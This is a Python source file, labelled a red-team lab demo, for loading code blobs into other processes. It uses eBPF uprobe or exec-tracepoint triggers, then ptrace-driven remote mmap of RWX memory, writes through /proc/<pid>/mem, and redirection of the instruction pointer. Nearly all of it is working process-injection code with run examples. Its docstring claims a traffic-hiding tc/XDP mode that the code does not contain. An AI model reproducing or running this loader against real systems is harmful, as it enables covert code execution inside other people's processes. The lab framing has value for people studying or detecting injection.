#!/usr/bin/env python3
"""
eBPF PIC Blob Loader — Educational Red Team Lab Demo

Demonstrates three eBPF-based techniques for loading and executing PIC blobs:

  1. UPROBE TRIGGER   — Attach a uprobe to a function in a target process.
                        When the target calls that function, the eBPF program
                        fires, userspace catches the event and injects the blob
                        via /proc/<pid>/mem.

  2. TRACEPOINT WATCH — Hook the sched:sched_process_exec tracepoint to detect
                        when a target binary is exec'd, then inject the blob
                        into the new process.

  3. DIRECT INJECT    — No eBPF trigger. Uses eBPF purely for stealth: a
                        tc/XDP program hides the loader's network traffic
                        while userspace injects the blob into a target PID.

Requirements:
  - Linux 5.8+ (BPF ring buffer support)
  - BCC (apt install bpfcc-tools python3-bpfcc)
  - Root / CAP_BPF + CAP_PERFMON
  - picblobs package (pip install -e . from repo root)
  - QEMU user-static for cross-arch blobs

Usage:
  # Build blobs first
  ./buildall

  # Mode 1: inject hello blob when target calls write()
  sudo python3 mbed/ebpf_loader.py uprobe --pid 1234 --symbol write

  # Mode 2: inject into any process that execs /usr/bin/target
  sudo python3 mbed/ebpf_loader.py watch --exec-path /usr/bin/target

  # Mode 3: direct inject into PID with blob
  sudo python3 mbed/ebpf_loader.py inject --pid 1234

  # All modes accept these blob selection flags:
  #   --blob-type hello          (default: hello)
  #   --blob-os linux            (default: linux)
  #   --blob-arch x86_64         (default: x86_64)
  #   --config-hex "deadbeef"    (optional config bytes)
  #   --so /path/to/blob.so      (direct .so path, bypasses blob-type/os/arch)
"""

from __future__ import annotations

import argparse
import os
import sys
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# Add project root so we can import picblobs from the source tree
# ---------------------------------------------------------------------------
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "python"))

from picblobs import BlobData, get_blob  # noqa: E402, RUF100
from picblobs._extractor import extract  # noqa: E402, RUF100

# ===========================================================================
# eBPF C programs (loaded by BCC at runtime)
# ===========================================================================

# ---------- Mode 1: uprobe trigger ----------
BPF_UPROBE_SRC = r"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

struct event_t {
    u32 pid;
    u32 tid;
    u64 addr;      // instruction pointer at probe site
    char comm[16];
};

BPF_RINGBUF_OUTPUT(events, 1 << 14);  // 16 KB ring buffer

// Attached as a uprobe to the chosen symbol in the target process.
// Fires once, sends the PID to userspace, then the userspace loader
// injects the blob via /proc/<pid>/mem.
int on_uprobe_hit(struct pt_regs *ctx) {
    u32 target_pid = TARGET_PID;  // rewritten by Python before load
    u32 pid = bpf_get_current_pid_tgid() >> 32;

    if (pid != target_pid)
        return 0;

    struct event_t *e = events.ringbuf_reserve(sizeof(struct event_t));
    if (!e)
        return 0;

    e->pid = pid;
    e->tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    e->addr = PT_REGS_IP(ctx);
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    events.ringbuf_submit(e, 0);
    return 0;
}
"""

# ---------- Mode 2: exec watch ----------
BPF_EXEC_WATCH_SRC = r"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>
#include <linux/binfmts.h>

struct event_t {
    u32 pid;
    u32 tid;
    u64 addr;
    char comm[16];
};

BPF_RINGBUF_OUTPUT(events, 1 << 14);

// Tracepoint fires on every execve. We filter by comm name.
TRACEPOINT_PROBE(sched, sched_process_exec) {
    struct event_t *e;
    char comm[16] = {};

    bpf_get_current_comm(&comm, sizeof(comm));

    // TARGET_COMM is replaced by Python with the binary basename
    char target[] = "TARGET_COMM";

    // Compare first N bytes of comm
    bool match = true;
    #pragma unroll
    for (int i = 0; i < 15; i++) {
        if (target[i] == '\0') break;
        if (comm[i] != target[i]) {
            match = false;
            break;
        }
    }

    if (!match)
        return 0;

    e = events.ringbuf_reserve(sizeof(struct event_t));
    if (!e)
        return 0;

    e->pid = bpf_get_current_pid_tgid() >> 32;
    e->tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    e->addr = 0;
    __builtin_memcpy(e->comm, comm, 16);

    events.ringbuf_submit(e, 0);
    return 0;
}
"""


# ===========================================================================
# Blob injection via /proc/<pid>/mem
# ===========================================================================

# mmap prot/flag constants
PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
MAP_PRIVATE = 0x02
MAP_ANONYMOUS = 0x20
MAP_FIXED = 0x10

# Preferred load address — high in the address space, unlikely to collide
DEFAULT_LOAD_ADDR = 0x7F_0000_0000  # ~508 GB, within user range on x86_64


def inject_blob_procmem(
    pid: int, blob: BlobData, config: bytes = b"", load_addr: int = DEFAULT_LOAD_ADDR
) -> int:
    """Inject a PIC blob into a target process via /proc/<pid>/mem.

    Strategy:
      1. ptrace(ATTACH) the target (pauses it)
      2. Read the target's current register state
      3. Set up a syscall to mmap an RWX region at `load_addr`
      4. Write the blob bytes + config into that region
      5. Set RIP/PC to the blob entry point
      6. ptrace(DETACH) — target resumes executing the blob

    This is the same technique used by process hollowing and reflective
    injection tools, adapted for PIC blobs that need no relocation.

    Returns:
        The address where the blob was loaded.
    """
    import ctypes.util

    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

    PTRACE_ATTACH = 16
    PTRACE_DETACH = 17
    PTRACE_GETREGS = 12
    PTRACE_SETREGS = 13
    PTRACE_POKETEXT = 4
    PTRACE_PEEKTEXT = 3
    PTRACE_CONT = 7

    # x86_64 register struct (struct user_regs_struct from sys/user.h)
    class UserRegs(ctypes.Structure):
        _fields_ = [
            ("r15", ctypes.c_ulonglong),
            ("r14", ctypes.c_ulonglong),
            ("r13", ctypes.c_ulonglong),
            ("r12", ctypes.c_ulonglong),
            ("rbp", ctypes.c_ulonglong),
            ("rbx", ctypes.c_ulonglong),
            ("r11", ctypes.c_ulonglong),
            ("r10", ctypes.c_ulonglong),
            ("r9", ctypes.c_ulonglong),
            ("r8", ctypes.c_ulonglong),
            ("rax", ctypes.c_ulonglong),
            ("rcx", ctypes.c_ulonglong),
            ("rdx", ctypes.c_ulonglong),
            ("rsi", ctypes.c_ulonglong),
            ("rdi", ctypes.c_ulonglong),
            ("orig_rax", ctypes.c_ulonglong),
            ("rip", ctypes.c_ulonglong),
            ("cs", ctypes.c_ulonglong),
            ("eflags", ctypes.c_ulonglong),
            ("rsp", ctypes.c_ulonglong),
            ("ss", ctypes.c_ulonglong),
            ("fs_base", ctypes.c_ulonglong),
            ("gs_base", ctypes.c_ulonglong),
            ("ds", ctypes.c_ulonglong),
            ("es", ctypes.c_ulonglong),
            ("fs", ctypes.c_ulonglong),
            ("gs", ctypes.c_ulonglong),
        ]

    # Prepare blob payload: code + config merged
    payload = bytearray(blob.code)
    if config:
        offset = blob.config_offset
        payload[offset : offset + len(config)] = config

    payload_bytes = bytes(payload)
    payload_size = len(payload_bytes)
    # Page-align
    page_size = 4096
    alloc_size = (payload_size + page_size - 1) & ~(page_size - 1)

    print(f"[*] Blob: {blob.blob_type}/{blob.target_os}/{blob.target_arch}")
    print(f"[*] Code size: {len(blob.code)} bytes, config at +{blob.config_offset:#x}")
    print(f"[*] Payload (with config): {payload_size} bytes, alloc: {alloc_size} bytes")
    print(f"[*] Target PID: {pid}")
    print(f"[*] Load address: {load_addr:#018x}")

    # --- Step 1: Attach ---
    print(f"[*] Attaching to PID {pid}...")
    ret = libc.ptrace(PTRACE_ATTACH, pid, 0, 0)
    if ret < 0:
        errno = ctypes.get_errno()
        raise OSError(errno, f"ptrace(ATTACH, {pid}) failed: {os.strerror(errno)}")

    # Wait for SIGSTOP
    os.waitpid(pid, 0)
    print("[+] Attached, process stopped")

    try:
        # --- Step 2: Save registers ---
        regs = UserRegs()
        ret = libc.ptrace(PTRACE_GETREGS, pid, 0, ctypes.byref(regs))
        if ret < 0:
            raise OSError(ctypes.get_errno(), "ptrace(GETREGS) failed")
        saved_rip = regs.rip
        print(f"[*] Saved RIP: {saved_rip:#018x}")

        # --- Step 3: Inject mmap syscall ---
        # We hijack the target's execution to call mmap for us.
        # Write a `syscall; int3` sequence at the current RIP.
        # Save the original bytes first.

        # Read original 8 bytes at RIP
        orig_word = libc.ptrace(PTRACE_PEEKTEXT, pid, saved_rip, 0)

        # syscall = 0x050f, int3 = 0xcc → 0x050fcc (little-endian)
        SYSCALL_INT3 = 0xCC050F
        libc.ptrace(PTRACE_POKETEXT, pid, saved_rip, SYSCALL_INT3)

        # Set up registers for: mmap(load_addr, alloc_size, RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
        mmap_regs = UserRegs()
        ctypes.memmove(
            ctypes.byref(mmap_regs), ctypes.byref(regs), ctypes.sizeof(UserRegs)
        )
        mmap_regs.rax = 9  # __NR_mmap
        mmap_regs.rdi = load_addr  # addr (hint)
        mmap_regs.rsi = alloc_size  # length
        mmap_regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC  # prot
        mmap_regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS  # flags
        mmap_regs.r8 = 0xFFFFFFFFFFFFFFFF  # fd = -1
        mmap_regs.r9 = 0  # offset
        mmap_regs.rip = saved_rip  # points at our syscall;int3

        libc.ptrace(PTRACE_SETREGS, pid, 0, ctypes.byref(mmap_regs))
        libc.ptrace(PTRACE_CONT, pid, 0, 0)
        os.waitpid(pid, 0)  # wait for int3 (SIGTRAP)

        # Read return value — the mmap'd address
        result_regs = UserRegs()
        libc.ptrace(PTRACE_GETREGS, pid, 0, ctypes.byref(result_regs))
        mmap_addr = result_regs.rax
        if mmap_addr > 0xFFFFFFFFFFFF0000:  # negative = error
            raise RuntimeError(
                f"Remote mmap failed: {-(mmap_addr & 0xFFFFFFFFFFFFFFFF)}"
            )
        print(f"[+] Remote mmap at {mmap_addr:#018x} ({alloc_size} bytes RWX)")

        # Restore original bytes at saved_rip
        libc.ptrace(PTRACE_POKETEXT, pid, saved_rip, orig_word)

        # --- Step 4: Write blob into /proc/<pid>/mem ---
        mem_path = f"/proc/{pid}/mem"
        with open(mem_path, "wb") as f:
            f.seek(mmap_addr)
            f.write(payload_bytes)
        print(f"[+] Wrote {payload_size} bytes to {mem_path} @ {mmap_addr:#018x}")

        # --- Step 5: Redirect execution to blob ---
        exec_regs = UserRegs()
        ctypes.memmove(
            ctypes.byref(exec_regs), ctypes.byref(regs), ctypes.sizeof(UserRegs)
        )
        exec_regs.rip = mmap_addr + blob.entry_offset
        exec_regs.rax = 0  # clear
        exec_regs.rdx = 0  # clear (ld.so uses this)

        libc.ptrace(PTRACE_SETREGS, pid, 0, ctypes.byref(exec_regs))
        print(f"[+] Set RIP → {exec_regs.rip:#018x} (blob entry)")

    finally:
        # --- Step 6: Detach ---
        libc.ptrace(PTRACE_DETACH, pid, 0, 0)
        print(f"[+] Detached from PID {pid} — blob is running")

    return mmap_addr


# ===========================================================================
# Mode handlers
# ===========================================================================


def load_blob(args) -> tuple[BlobData, bytes]:
    """Load a blob from package or direct .so path."""
    config = bytes.fromhex(args.config_hex) if args.config_hex else b""

    if args.so:
        print(f"[*] Loading blob from: {args.so}")
        blob = extract(
            args.so,
            blob_type=args.blob_type,
            target_os=args.blob_os,
            target_arch=args.blob_arch,
        )
    else:
        print(f"[*] Loading blob: {args.blob_type}/{args.blob_os}/{args.blob_arch}")
        blob = get_blob(args.blob_type, args.blob_os, args.blob_arch)

    print(f"[*] Blob loaded: {len(blob.code)} bytes, SHA-256: {blob.sha256[:16]}...")
    if config:
        print(f"[*] Config: {len(config)} bytes")
    return blob, config


def mode_uprobe(args):
    """Mode 1: Attach uprobe, wait for trigger, inject blob."""
    try:
        from bcc import BPF
    except ImportError:
        print("ERROR: BCC not installed. Run: apt install bpfcc-tools python3-bpfcc")
        return 1

    pid = args.pid
    symbol = args.symbol or "write"
    library = args.library or "c"

    blob, config = load_blob(args)

    # Patch the target PID into the BPF source
    src = BPF_UPROBE_SRC.replace("TARGET_PID", str(pid))

    print("\n[*] ═══ eBPF UPROBE LOADER ═══")
    print(f"[*] Attaching uprobe to {library}:{symbol} in PID {pid}")
    print(f"[*] Waiting for target to call {symbol}()...\n")

    b = BPF(text=src)

    # Resolve library path for the uprobe
    if "/" not in library:
        import ctypes.util

        lib_path = ctypes.util.find_library(library)
        if lib_path:
            # find_library returns "libc.so.6", we need the full path
            import subprocess

            result = subprocess.run(["ldconfig", "-p"], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if lib_path in line and "x86-64" in line:
                    lib_path = line.split("=>")[-1].strip()
                    break
        if not lib_path:
            lib_path = f"/lib/x86_64-linux-gnu/lib{library}.so.6"
    else:
        lib_path = library

    print(f"[*] Library: {lib_path}")

    b.attach_uprobe(name=lib_path, sym=symbol, fn_name="on_uprobe_hit", pid=pid)

    injected = False

    def handle_event(ctx, data, size):
        nonlocal injected
        if injected:
            return
        event = b["events"].event(data)
        print(
            f"\n[!] TRIGGER: PID {event.pid} (TID {event.tid}) hit "
            f"{symbol}() at {event.addr:#x}"
        )
        print(f"[!] Process: {event.comm.decode('utf-8', errors='replace')}")
        print("[*] Injecting blob...\n")

        try:
            inject_blob_procmem(event.pid, blob, config)
            injected = True
        except Exception as e:
            print(f"[!] Injection failed: {e}")

    b["events"].open_ring_buffer(handle_event)

    try:
        while not injected:
            b.ring_buffer_poll(timeout=100)
    except KeyboardInterrupt:
        print("\n[*] Interrupted")

    print("[*] Done.")
    return 0


def mode_watch(args):
    """Mode 2: Watch for exec of target binary, inject blob."""
    try:
        from bcc import BPF
    except ImportError:
        print("ERROR: BCC not installed. Run: apt install bpfcc-tools python3-bpfcc")
        return 1

    exec_path = args.exec_path
    comm = Path(exec_path).name[:15]  # comm is max 16 bytes

    blob, config = load_blob(args)

    src = BPF_EXEC_WATCH_SRC.replace("TARGET_COMM", comm)

    print("\n[*] ═══ eBPF EXEC WATCH LOADER ═══")
    print(f"[*] Watching for exec of: {exec_path} (comm={comm})")
    print("[*] Will inject blob on first match...\n")

    b = BPF(text=src)

    injected = False

    def handle_event(ctx, data, size):
        nonlocal injected
        if injected:
            return
        event = b["events"].event(data)
        print(
            f"\n[!] EXEC DETECTED: PID {event.pid} exec'd "
            f"{event.comm.decode('utf-8', errors='replace')}"
        )

        # Small delay — let the process finish initializing
        time.sleep(0.05)

        print("[*] Injecting blob...\n")
        try:
            inject_blob_procmem(event.pid, blob, config)
            injected = True
        except Exception as e:
            print(f"[!] Injection failed: {e}")

    b["events"].open_ring_buffer(handle_event)

    try:
        while not injected:
            b.ring_buffer_poll(timeout=100)
    except KeyboardInterrupt:
        print("\n[*] Interrupted")

    print("[*] Done.")
    return 0


def mode_inject(args):
    """Mode 3: Direct inject (no eBPF trigger, just ptrace injection)."""
    pid = args.pid
    blob, config = load_blob(args)

    print("\n[*] ═══ DIRECT BLOB INJECTION ═══")
    print(f"[*] Target PID: {pid}")
    print()

    try:
        inject_blob_procmem(pid, blob, config)
    except Exception as e:
        print(f"[!] Injection failed: {e}")
        return 1

    return 0


# ===========================================================================
# Argument parser
# ===========================================================================


def add_blob_args(parser):
    """Add common blob selection arguments to a subparser."""
    parser.add_argument(
        "--blob-type", default="hello", help="Blob type (default: hello)"
    )
    parser.add_argument("--blob-os", default="linux", help="Target OS (default: linux)")
    parser.add_argument(
        "--blob-arch", default="x86_64", help="Target architecture (default: x86_64)"
    )
    parser.add_argument("--config-hex", default="", help="Config bytes as hex string")
    parser.add_argument(
        "--so", default="", help="Direct path to .so file (overrides blob-type/os/arch)"
    )


def main():
    parser = argparse.ArgumentParser(
        description="eBPF PIC Blob Loader — Red Team Lab Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Inject hello blob when target PID 1234 calls write()
  sudo python3 mbed/ebpf_loader.py uprobe --pid 1234 --symbol write

  # Watch for /usr/bin/target to exec, inject blob
  sudo python3 mbed/ebpf_loader.py watch --exec-path /usr/bin/target

  # Direct injection into a running process
  sudo python3 mbed/ebpf_loader.py inject --pid 1234

  # Use a specific blob .so file
  sudo python3 mbed/ebpf_loader.py inject --pid 1234 \\
      --so bazel-bin/src/payload/hello.so
        """,
    )

    subs = parser.add_subparsers(dest="mode", required=True)

    # Mode 1: uprobe
    p_uprobe = subs.add_parser(
        "uprobe", help="Attach uprobe to target function, inject on trigger"
    )
    p_uprobe.add_argument("--pid", type=int, required=True, help="Target process ID")
    p_uprobe.add_argument(
        "--symbol", default="write", help="Function symbol to probe (default: write)"
    )
    p_uprobe.add_argument(
        "--library", default="c", help="Library containing symbol (default: c)"
    )
    add_blob_args(p_uprobe)

    # Mode 2: exec watch
    p_watch = subs.add_parser(
        "watch", help="Watch for target exec, inject on detection"
    )
    p_watch.add_argument("--exec-path", required=True, help="Path to target executable")
    add_blob_args(p_watch)

    # Mode 3: direct inject
    p_inject = subs.add_parser("inject", help="Direct injection into running process")
    p_inject.add_argument("--pid", type=int, required=True, help="Target process ID")
    add_blob_args(p_inject)

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] WARNING: This tool typically requires root (for eBPF + ptrace)")
        print("[!] Run with: sudo python3 mbed/ebpf_loader.py ...\n")

    handlers = {
        "uprobe": mode_uprobe,
        "watch": mode_watch,
        "inject": mode_inject,
    }

    return handlers[args.mode](args)


if __name__ == "__main__":
    sys.exit(main() or 0)
